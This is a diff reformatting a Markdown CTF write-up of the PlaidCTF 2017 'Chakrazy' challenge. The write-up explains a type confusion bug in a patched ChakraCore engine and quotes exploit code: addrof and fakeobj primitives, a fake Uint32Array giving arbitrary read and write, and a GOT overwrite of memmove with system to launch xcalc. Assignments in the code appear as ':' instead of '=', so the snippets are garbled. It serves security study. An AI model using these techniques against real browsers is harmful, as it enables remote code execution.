@@ -1,31 +1,41 @@
 ---
 type: ctf
-title : confusion bug in ChakraCore
+title: confusion bug in ChakraCore
 tags: [ChakraCore]
-date : 2017-12-26
+date: 2017-12-26
 author: Eno
 featuredImage: https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShtOWDTVwb62ufSJNT86vdlhA34d2SHOTEsA&usqp=CAU
 ---
 
 ## Introduction
 
-[Chakrazy](https://ctftime.org/task/4088) is a browser CTF challenge created by team PPP for the [2017 PlaidCTF event](https://ctftime.org/event/439). It's a challenge based on Microsoft's ChakraCore Javascript engine. You can download the challenge file [here](https://drive.google.com/file/d/1aaDLRdl19ffT1-pn_9o4gNTcbR9kwypG/view?usp=sharing).
+[Chakrazy](https://ctftime.org/task/4088) is a browser CTF challenge created by team PPP for the
+[2017 PlaidCTF event](https://ctftime.org/event/439). It's a challenge based on Microsoft's ChakraCore Javascript
+engine. You can download the challenge file
+[here](https://drive.google.com/file/d/1aaDLRdl19ffT1-pn_9o4gNTcbR9kwypG/view?usp=sharing).
 
-Similar to my [previous post](https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/), this post is more like a note about how I learn to exploit the type confusion vulnerability in the ChakraCore engine.
+Similar to my
+[previous post](https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/),
+this post is more like a note about how I learn to exploit the type confusion vulnerability in the ChakraCore engine.
 
 ## Pre-knowledge
 
-It is recommanded that the reader have some basic knowledge about the type confusion bug and the internal data structures of the ChakraCore engine. Here are some slides from the [360Vulscan team](http://conference.hitb.org/hitbsecconf2017ams/materials/D1T2%20-%20Linan%20Hao%20and%20Long%20Liu%20-%20The%20Secret%20of%20ChakraCore.pdf) and [Natalie@Google Project Zero](https://www.blackhat.com/docs/us-17/thursday/us-17-Silvanovich-The-Origin-Of-Array-Symbol-Species.pdf). 
+It is recommanded that the reader have some basic knowledge about the type confusion bug and the internal data
+structures of the ChakraCore engine. Here are some slides from the
+[360Vulscan team](http://conference.hitb.org/hitbsecconf2017ams/materials/D1T2%20-%20Linan%20Hao%20and%20Long%20Liu%20-%20The%20Secret%20of%20ChakraCore.pdf)
+and
+[Natalie@Google Project Zero](https://www.blackhat.com/docs/us-17/thursday/us-17-Silvanovich-The-Origin-Of-Array-Symbol-Species.pdf).
 
 ## Environment Setting
 
-* Ubuntu Linux 16.04 64 bit
-* [ChakraCore@dd33b4ceaf4b38b44d279d13988ecbd31df46ed2](https://github.com/Microsoft/ChakraCore/tree/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2)
-* GEF debugger
+- Ubuntu Linux 16.04 64 bit
+- [ChakraCore@dd33b4ceaf4b38b44d279d13988ecbd31df46ed2](https://github.com/Microsoft/ChakraCore/tree/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2)
+- GEF debugger
 
 ## Building and Debugging the ChakraCore engine
 
-Building the ChakraCore engine is simple, just follow the instructions in the [wiki page](https://github.com/Microsoft/ChakraCore/wiki/Building-ChakraCore). 
+Building the ChakraCore engine is simple, just follow the instructions in the
+[wiki page](https://github.com/Microsoft/ChakraCore/wiki/Building-ChakraCore).
 
 For a Debug build:
 
@@ -36,7 +46,8 @@ patch -p1 < ../change.diff # apply the patch
 ./build.sh --debug
 ```
 
-Later we'll find the binaries in the `out/Debug` directory. If you want a Release build with debug symbols, you'll have to modified the `CMakeLists.txt`:
+Later we'll find the binaries in the `out/Debug` directory. If you want a Release build with debug symbols, you'll have
+to modified the `CMakeLists.txt`:
 
 ```
 # At line 355
@@ -50,9 +61,11 @@ if(NOT CMAKE_BUILD_TYPE STREQUAL Debug)
 else()
 ```
 
-I modified the optimization flag to `O0` because the `O3` flag will optimized out the function parameter and causes some inconvenience during the debug process. 
+I modified the optimization flag to `O0` because the `O3` flag will optimized out the function parameter and causes some
+inconvenience during the debug process.
 
-Here I chose to build the Release build with debug symbols, since it's behavior is more close to the challenge binary ( which is a Release build with the `O3` optimization flag ). Later we can just use 
+Here I chose to build the Release build with debug symbols, since it's behavior is more close to the challenge binary (
+which is a Release build with the `O3` optimization flag ). Later we can just use
 
 ```
 gef --args out/Debug/ch exploit.js
@@ -82,16 +95,21 @@ index a666b0b..0e8a073 100644
                      pDestArray->SetItem(idxDest, aItem, PropertyOperation_ThrowIfNotExtensible);
 ```
 
-The code is in the [JavascriptArray::ConcatIntArgs](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3143) function, where `pDestArray`'s data type is **"suppose"** to be `JavascriptNativeIntArray`. 
+The code is in the
+[JavascriptArray::ConcatIntArgs](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3143)
+function, where `pDestArray`'s data type is **"suppose"** to be `JavascriptNativeIntArray`.
 
-Here it **removed the code that does the type checking of `pDestArray`**. There's no need to do the type checking right ? Since `pDestArray` will always be `JavascriptNativeIntArray` isn't it ? Well......
+Here it **removed the code that does the type checking of `pDestArray`**. There's no need to do the type checking right
+? Since `pDestArray` will always be `JavascriptNativeIntArray` isn't it ? Well......
 
 ## Analyzing the Exploit
 
-We now start analyzing the challenge [exploit code](https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba) ( written by [eboda](https://twitter.com/edgarboda) ) and see how the exploit works. We'll focus on the `addrof` and the `fakeobj` functions, since it's the most important part of the entire exploit.
-
+We now start analyzing the challenge [exploit code](https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba) (
+written by [eboda](https://twitter.com/edgarboda) ) and see how the exploit works. We'll focus on the `addrof` and the
+`fakeobj` functions, since it's the most important part of the entire exploit.
 
 ### addrof
+
 The `addrof` function is used for leaking an object's memory address. The most important part are the following code:
 
 ```javascript
@@ -114,13 +132,19 @@ The `addrof` function is used for leaking an object's memory address. The most i
     }};
 
     Object.defineProperty(b, Symbol.isConcatSpreadable, fakeProp);
-    
+
     // trigger the vulnerability
     var c : a.concat(b);
 
 ```
 
-When the line `var c : a.concat(b);` was executed, it will first call [ArraySpeciesCreate()](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3437), which in this case will return a `JavascriptNativeIntArray` ( line 2~9 ). Then it will goto [line 3497](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3497) and call [ConcatIntArgs()](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3143), our vulnerability function.
+When the line `var c : a.concat(b);` was executed, it will first call
+[ArraySpeciesCreate()](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3437),
+which in this case will return a `JavascriptNativeIntArray` ( line 2~9 ). Then it will goto
+[line 3497](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3497)
+and call
+[ConcatIntArgs()](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3143),
+our vulnerability function.
 
 There's a for loop inside the `ConcatIntArgs()` functions:
 
@@ -161,9 +185,14 @@ fakeProp : { get: function() {
 Object.defineProperty(b, Symbol.isConcatSpreadable, fakeProp);
 ```
 
-So when `aItem` : `b` and ran to line `JavascriptOperators::IsConcatSpreadable(aItem)`, it will change `pDestArray`'s data type from `JavascriptNativeIntArray` to `JavascriptArray`. It'll also change `b`'s data type into `JavascriptArray`, so later it can run to line `JavascriptNativeIntArray::ConvertToVarArray(pDestArray);`.
+So when `aItem` : `b` and ran to line `JavascriptOperators::IsConcatSpreadable(aItem)`, it will change `pDestArray`'s
+data type from `JavascriptNativeIntArray` to `JavascriptArray`. It'll also change `b`'s data type into
+`JavascriptArray`, so later it can run to line `JavascriptNativeIntArray::ConvertToVarArray(pDestArray);`.
 
-We can see that [JavascriptNativeIntArray::ConvertToVarArray](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L1832)'s first parameter is a `JavascriptNativeIntArray` data type. But here we pass a `JavascriptArray` data type variable instead, which leads to a **type confusion** vulnerability. 
+We can see that
+[JavascriptNativeIntArray::ConvertToVarArray](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L1832)'s
+first parameter is a `JavascriptNativeIntArray` data type. But here we pass a `JavascriptArray` data type variable
+instead, which leads to a **type confusion** vulnerability.
 
 When `ConvertToVarArray(pDestArray)` was called, the `pDestArray` has the following memory layout:
 
@@ -181,7 +210,10 @@ gef➤  tel 0x00007ffff03d8320
 0x00007ffff03d8368│+0x48: 0x8000000280000002
 ```
 
-Here `dest[0]` stores the object's address. Since the function "think" that `pDestArray` is a `JavscriptNativeIntArray`, it will take first three elements ( `0xf03d8140`, `0x7ffff` and `0x1` ) and convert them into the form of the `JavascriptArray` elements. After the conversion the memory layout will become something like:
+Here `dest[0]` stores the object's address. Since the function "think" that `pDestArray` is a `JavscriptNativeIntArray`,
+it will take first three elements ( `0xf03d8140`, `0x7ffff` and `0x1` ) and convert them into the form of the
+`JavascriptArray` elements. After the conversion the memory layout will become something like:
+
 ```
 gef➤  tel 0x00007ffff03d83c0
 0x00007ffff03d83c0│+0x00: 0x0000000300000000
@@ -192,10 +224,12 @@ gef➤  tel 0x00007ffff03d83c0
 0x00007ffff03d83e8│+0x28: 0x0001000000000001  <-- dest[2]
 ```
 
-Note that `dest[0]` and `dest[1]` now stores the value of the object's address ( lower part and upper part ), thus we can leak the object's memory address by combining `c[0]` & `c[1]`. 
+Note that `dest[0]` and `dest[1]` now stores the value of the object's address ( lower part and upper part ), thus we
+can leak the object's memory address by combining `c[0]` & `c[1]`.
 
 ### fakeobj
-The goal of `fakeobj` is to fake a Javascript object at an arbitrary address. 
+
+The goal of `fakeobj` is to fake a Javascript object at an arbitrary address.
 
 ```javascript
     var a1 : [];
@@ -222,15 +256,18 @@ The goal of `fakeobj` is to fake a Javascript object at an arbitrary address.
     return res[0x100/2]; // res[128] : an object @ addr
 ```
 
-Here when `var res : a1.concat(a2);` was executed, the ChakraCore engine will ran to line [3176](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3176):
+Here when `var res : a1.concat(a2);` was executed, the ChakraCore engine will ran to line
+[3176](https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3176):
 
 ```
 bool converted : CopyNativeIntArrayElements(pDestArray, idxDest, pItemArray);
 ```
 
-Here `pDestArray` is **"suppose"** to be a `JavscriptNativeIntAarray`, but again, we pass the argument as a `JavascriptArray` data type instead, causing the type confusion vulnerability.
+Here `pDestArray` is **"suppose"** to be a `JavscriptNativeIntAarray`, but again, we pass the argument as a
+`JavascriptArray` data type instead, causing the type confusion vulnerability.
 
-Later the lower part and the upper part of the address ( `a2[0]` & `a2[1]` ) will be appended into `pDestArray` ( in the form of `int32` ). The memory layout of `res` array will become:
+Later the lower part and the upper part of the address ( `a2[0]` & `a2[1]` ) will be appended into `pDestArray` ( in the
+form of `int32` ). The memory layout of `res` array will become:
 
 ```
 .......................
@@ -239,17 +276,21 @@ Later the lower part and the upper part of the address ( `a2[0]` & `a2[1]` ) wil
 0x00007ffff02d8418│+0x20: 0x00007ffff03d84f0  <-- res[128]
 ```
 
-Due to type confusion, now `res` will be treated as `JavascriptArray` and think that `res[128]` is an object ( which its address : `0x00007ffff03d84f0` ). By returning `res[128]` we now have the fake object's handle.
+Due to type confusion, now `res` will be treated as `JavascriptArray` and think that `res[128]` is an object ( which its
+address : `0x00007ffff03d84f0` ). By returning `res[128]` we now have the fake object's handle.
 
 ### arbitrary read/write primitive
 
-The exploit code first fake an `Uint32Array` object, then modify its data buffer's pointer to obtain the arbitrary read/write primitive. To fake an `Uint32Array` object, it will need:
+The exploit code first fake an `Uint32Array` object, then modify its data buffer's pointer to obtain the arbitrary
+read/write primitive. To fake an `Uint32Array` object, it will need:
 
-* Address of `Uint32Array`'s vtable.
-* A pointer point to `0x30` ( `Uint32Array`'s type id. Check [this link](https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Types/EdgeJavascriptTypeId.h) for more information )
-* A fake size
-* An `ArrayBuffer`'s address
-* A fake data buffer pointer
+- Address of `Uint32Array`'s vtable.
+- A pointer point to `0x30` ( `Uint32Array`'s type id. Check
+  [this link](https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Types/EdgeJavascriptTypeId.h) for more
+  information )
+- A fake size
+- An `ArrayBuffer`'s address
+- A fake data buffer pointer
 
 From the exploit code we can see it use `Array` to fake those data:
 
@@ -259,7 +300,7 @@ var real : new Array(16);
 var real_addr : addrof(real);
 
 // fake vtable pointer
-real[0] : lower(uint_vtable); 
+real[0] : lower(uint_vtable);
 real[1] : upper(uint_vtable);
 
 // fake type pointer
@@ -285,7 +326,8 @@ real[12] : 0;
 real[13] : 0;
 ```
 
-As for read/write primitive, it first assign the address in `real[14]` & `real[15]` to modify the data buffer's pointer, then use `fakeobj` to obtain the handle of the fake `Uint32Array` object:
+As for read/write primitive, it first assign the address in `real[14]` & `real[15]` to modify the data buffer's pointer,
+then use `fakeobj` to obtain the handle of the fake `Uint32Array` object:
 
 ```javascript
     // the following creates an object which we will use to read and write
@@ -293,7 +335,7 @@ As for read/write primitive, it first assign the address in `real[14]` & `real[1
     var memory : {
         handle: fakeobj(real_addr + 0x58), // return fake object
         init: function(addr) {
-            // we set the buffer pointer of the fake Uint32Array to the 
+            // we set the buffer pointer of the fake Uint32Array to the
             // target address
             real[14] : lower(addr);
             real[15] : upper(addr);
@@ -320,7 +362,7 @@ function pwn() {
     // exploit the bug and create our arbitrary r/w primitive
     var mem : gimme_rw();
 
-    // get the base of libChakraCore.so                                                                                                                                                                     
+    // get the base of libChakraCore.so
     var base : get_base(mem);
     console.log("[+] base @ " + base.toString(16));
 
@@ -334,14 +376,14 @@ function pwn() {
     var system : write_addr - 0xe3a100;
     console.log("[+] system @ " + system.toString(16));
 
-    // now set up our command 
+    // now set up our command
     var cmd : "/usr/bin/xcalc\0";
 
     // write the command into a Uint8Array
     var target : new Uint8Array(0x1234);
     for (var i : 0; i < cmd.length; i++) {
         target[i] : cmd.charCodeAt(i);
-    }   
+    }
 
     // overwrite memmove with system
     mem.write32(memmove_got, lower(system));
@@ -353,30 +395,37 @@ function pwn() {
 }
 ```
 
-The original exploit code overwrites two GOT entries ( `memmove` & `memset` ) and tries to call `execve("/bin/sh", argv, envp)`, which is more complicated ( but more stable, since it doesn't need to know the version of `libc.so` ). Here I choose a more simple way to achieve RCE.
-
-
+The original exploit code overwrites two GOT entries ( `memmove` & `memset` ) and tries to call
+`execve("/bin/sh", argv, envp)`, which is more complicated ( but more stable, since it doesn't need to know the version
+of `libc.so` ). Here I choose a more simple way to achieve RCE.
 
 ## Summary
 
-The patch removed the code that does the type checking inside the `JavascriptArray::ConcatIntArgs()` function. This make us able to tamper the data type of `pDestArray` by defining the property of `Symbol.isConcatSpreadable`.
+The patch removed the code that does the type checking inside the `JavascriptArray::ConcatIntArgs()` function. This make
+us able to tamper the data type of `pDestArray` by defining the property of `Symbol.isConcatSpreadable`.
 
-Here we modify `pDestArray`'s data type from `JavascriptNativeIntArray` to `JavascriptArray` and trigger the type confusion bug. We can later exploit the bug to:
+Here we modify `pDestArray`'s data type from `JavascriptNativeIntArray` to `JavascriptArray` and trigger the type
+confusion bug. We can later exploit the bug to:
+
 1. Leak an object's address
 2. Fake an object at an arbitrary address
 
-To obtain the arbitrary read/write primitive, we fake an `Uint32Array` object, modify its data buffer's pointer and obtain its object handle. Later we can use this handle to read/write memory content. We then leak the address of `libChakraCore.so` and `libc.so`, calculate `system`'s address and overwrite `memmove`'s GOT to do the GOT hijacking & achieve RCE.
+To obtain the arbitrary read/write primitive, we fake an `Uint32Array` object, modify its data buffer's pointer and
+obtain its object handle. Later we can use this handle to read/write memory content. We then leak the address of
+`libChakraCore.so` and `libc.so`, calculate `system`'s address and overwrite `memmove`'s GOT to do the GOT hijacking &
+achieve RCE.
 
 ## Epilogue
 
-Learn a lot from this one. Type confusion bugs are very common vulnerabilities in the real-world softwares, and this challenge is a great example of how it will affect the security of the modern browsers. 
+Learn a lot from this one. Type confusion bugs are very common vulnerabilities in the real-world softwares, and this
+challenge is a great example of how it will affect the security of the modern browsers.
 
 Next stop: [V9](https://github.com/saelo/v9) !
 
 ## Reference
 
-* [isConcatSpreadable on MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/isConcatSpreadable)
-* [Building ChakraCore engine](https://github.com/Microsoft/ChakraCore/wiki/Building-ChakraCore)
-* [The Secret of ChakraCore: 10 Ways to Go Beyond the Edge](http://conference.hitb.org/hitbsecconf2017ams/materials/D1T2%20-%20Linan%20Hao%20and%20Long%20Liu%20-%20The%20Secret%20of%20ChakraCore.pdf)
-* [The Origin of Array [@@species]](https://www.blackhat.com/docs/us-17/thursday/us-17-Silvanovich-The-Origin-Of-Array-Symbol-Species.pdf)
-* [First Step to Browser Exploitation (Korean)](http://mashirogod.dothome.co.kr/index.php/2017/01/07/first-step-to-browser-exploitation/)
+- [isConcatSpreadable on MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/isConcatSpreadable)
+- [Building ChakraCore engine](https://github.com/Microsoft/ChakraCore/wiki/Building-ChakraCore)
+- [The Secret of ChakraCore: 10 Ways to Go Beyond the Edge](http://conference.hitb.org/hitbsecconf2017ams/materials/D1T2%20-%20Linan%20Hao%20and%20Long%20Liu%20-%20The%20Secret%20of%20ChakraCore.pdf)
+- [The Origin of Array [@@species]](https://www.blackhat.com/docs/us-17/thursday/us-17-Silvanovich-The-Origin-Of-Array-Symbol-Species.pdf)
+- [First Step to Browser Exploitation (Korean)](http://mashirogod.dothome.co.kr/index.php/2017/01/07/first-step-to-browser-exploitation/)
